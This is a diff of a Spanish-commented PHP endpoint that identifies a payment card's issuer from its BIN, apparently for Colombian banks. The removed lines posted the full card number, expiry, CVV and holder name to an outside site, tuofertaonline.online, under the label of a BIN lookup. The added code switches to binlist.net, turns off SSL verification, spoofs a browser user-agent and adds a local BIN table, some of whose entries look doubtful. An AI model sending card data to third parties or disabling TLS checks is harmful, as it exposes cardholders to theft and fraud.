@@ -5,8 +5,8 @@ ini_set('display_errors', 0);
 header('Content-Type: application/json; charset=utf-8');
 
 // CONFIGURACIÓN DE PROVEEDOR DE BIN
-// Opciones: 'tuofertaonline', 'bincodes', 'fraudlabspro'
-define('BIN_PROVIDER', 'tuofertaonline');
+// Opciones: 'binlist', 'bincodes', 'fraudlabspro'
+define('BIN_PROVIDER', 'binlist');
 
 // CLAVES DE API (Rellenar si se usa bincodes o fraudlabspro)
 define('BINCODES_API_KEY', 'YOUR_BINCODES_API_KEY');
@@ -28,7 +28,66 @@ $bin = substr($cardNumber, 0, 6);
 $issuer = 'Desconocido';
 $scheme = 'Desconocido';
 
-// 1. CONSULTAR EL BIN SEGÚN EL PROVEEDOR CONFIGURADO
+// Base de datos de BINs locales para bancos de Colombia
+$localBins = array(
+    // Davivienda
+    '400135' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '401676' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '404179' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444376' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444300' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444301' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444302' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444303' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444304' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444305' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444306' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444307' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444308' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '444309' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '459321' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
+    '516139' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
+    '522216' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
+    '530592' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
+    '540751' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
+    '554522' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
+    
+    // Bancolombia
+    '411111' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
+    '422474' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
+    '425837' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
+    '491567' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
+    '519911' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
+    '524708' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
+    '530699' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
+    '540698' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
+    '552636' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
+
+    // Banco de Bogotá
+    '403212' => array('bank' => 'Banco de Bogotá', 'scheme' => 'Visa'),
+    '405230' => array('bank' => 'Banco de Bogotá', 'scheme' => 'Visa'),
+    '459490' => array('bank' => 'Banco de Bogotá', 'scheme' => 'Visa'),
+    '525381' => array('bank' => 'Banco de Bogotá', 'scheme' => 'MasterCard'),
+    '530514' => array('bank' => 'Banco de Bogotá', 'scheme' => 'MasterCard'),
+    '541203' => array('bank' => 'Banco de Bogotá', 'scheme' => 'MasterCard'),
+
+    // BBVA
+    '410260' => array('bank' => 'BBVA', 'scheme' => 'Visa'),
+    '491522' => array('bank' => 'BBVA', 'scheme' => 'Visa'),
+    '491583' => array('bank' => 'BBVA', 'scheme' => 'Visa'),
+    '525686' => array('bank' => 'BBVA', 'scheme' => 'MasterCard'),
+    '548906' => array('bank' => 'BBVA', 'scheme' => 'MasterCard'),
+
+    // AV Villas
+    '402845' => array('bank' => 'AV Villas', 'scheme' => 'Visa'),
+    '459346' => array('bank' => 'AV Villas', 'scheme' => 'Visa'),
+    '520141' => array('bank' => 'AV Villas', 'scheme' => 'MasterCard'),
+    '521191' => array('bank' => 'AV Villas', 'scheme' => 'MasterCard'),
+);
+
+$binVerificado = false;
+
+// 1. CONSULTAR EL BIN EN TIEMPO REAL Y DE FORMA AUTOMÁTICA
 if (BIN_PROVIDER === 'bincodes' && BINCODES_API_KEY !== 'YOUR_BINCODES_API_KEY') {
     // Proveedor BinCodes
     $url = "https://api.bincodes.com/bin/?format=json&api_key=" . urlencode(BINCODES_API_KEY) . "&bin=" . urlencode($bin);
@@ -43,6 +102,7 @@ if (BIN_PROVIDER === 'bincodes' && BINCODES_API_KEY !== 'YOUR_BINCODES_API_KEY')
         $result = json_decode($response, true);
         if (isset($result['bank']) && !empty($result['bank'])) {
             $issuer = $result['bank'];
+            $binVerificado = true;
         }
         if (isset($result['card']) && !empty($result['card'])) {
             $scheme = $result['card'];
@@ -62,42 +122,44 @@ if (BIN_PROVIDER === 'bincodes' && BINCODES_API_KEY !== 'YOUR_BINCODES_API_KEY')
         $result = json_decode($response, true);
         if (isset($result['card_issuing_bank']) && !empty($result['card_issuing_bank'])) {
             $issuer = $result['card_issuing_bank'];
+            $binVerificado = true;
         }
         if (isset($result['card_brand']) && !empty($result['card_brand'])) {
             $scheme = $result['card_brand'];
         }
     }
 } else {
-    // Proveedor por defecto: tuofertaonline (usado originalmente en load.php)
-    $cardData = array(
-        'number' => $cardNumber,
-        'expiry_month' => isset($data['expMonth']) ? $data['expMonth'] : "12",
-        'expiry_year' => isset($data['expYear']) ? $data['expYear'] : "2025",
-        'cvv' => isset($data['cvv']) ? $data['cvv'] : "221",
-        'name' => isset($data['ownerName']) ? $data['ownerName'] : "PEDRO MONTES",
-        'billing_address' => array('country' => "CO"),
-        'phone' => (object) array()
-    );
-
-    $ch = curl_init('https://tuofertaonline.online/web/apicc.php');
+    // Proveedor por defecto: binlist.net (automático, público y gratuito)
+    $url = "https://lookup.binlist.net/" . urlencode($bin);
+    $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($cardData));
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-    
+    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+    // User-agent simulado para evitar bloqueos por cabecera vacía
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    ));
     $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
 
-    if ($response) {
+    if ($httpCode === 200 && $response) {
         $result = json_decode($response, true);
-        if (isset($result['issuer']) && !empty($result['issuer'])) {
-            $issuer = $result['issuer'];
+        if (isset($result['bank']['name']) && !empty($result['bank']['name'])) {
+            $issuer = $result['bank']['name'];
+            $binVerificado = true;
         }
         if (isset($result['scheme']) && !empty($result['scheme'])) {
             $scheme = $result['scheme'];
         }
+    }
+}
+
+// 2. FALLBACK A DICCIONARIO LOCAL SI LA CONSULTA AUTOMÁTICA DE API FALLÓ O SUPERÓ LÍMITES
+if (!$binVerificado) {
+    if (isset($localBins[$bin])) {
+        $issuer = $localBins[$bin]['bank'];
+        $scheme = $localBins[$bin]['scheme'];
     }
 }
 
